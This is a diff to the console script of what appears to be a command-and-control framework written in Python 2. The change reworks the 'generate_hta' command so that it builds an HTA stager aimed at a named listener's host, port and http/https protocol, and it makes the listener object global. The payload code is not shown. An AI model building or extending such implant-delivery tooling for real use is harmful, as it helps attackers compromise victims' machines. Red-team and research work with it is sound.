@@ -11,9 +11,10 @@ from termcolor import colored
 from core.functions import *
 from core.weblistener import *
 from flask import *
+from profile import *
 import logging
 
-
+listeners=NewListener()
 def ctrlc(sig, frame):
     pass
 
@@ -40,8 +41,6 @@ while True:
     if command == "help":
         main_help_banner()
 
-    if command == "generate_hta":
-        generate_hta(ip, port, path)
 
     if command == "listeners":
         list_listeners()
@@ -89,6 +88,32 @@ while True:
                 proto_to_use = "http"
 
             generate(hostname, path, proto_to_use, interval)
+        except KeyError:
+            print colored("[-] Wrong listener selected !", "red")
+            continue
+
+    if command.split(" ")[0] == "generate_hta":
+        try:
+            listener = command.split(" ")[1]
+        except IndexError:
+            print colored("[-] Please select a listener !", "red")
+            print colored("Syntax :  generate_hta listener_name", "green")
+            print colored("Example : generate_hta listener1", "yellow")
+            continue
+
+        try:
+            host_ip = listeners_information[listener][3]
+            bind_port=listeners_information[listener][2]
+            path = listeners_information[listener][5]
+            proto = listeners_information[listener][6]
+
+            # check if protocol is True then https is used
+            if proto:
+                proto_to_use = "https"
+            else:
+                proto_to_use = "http"
+            listeners.create_hta()
+            generate_hta(host_ip,bind_port,proto_to_use)
         except KeyError:
             print colored("[-] Wrong listener selected !", "red")
             continue
@@ -190,6 +215,8 @@ while True:
                         )
                     listener.start_listener()
                     listener.create_path()
+                    #in order to make it global so we can use in other functions 
+                    listeners=listener
                     print colored("[+]%s Listener has been created" % listener_name, "green")
                 else:
                     print colored("[-] URL name already used, please change it", "red")
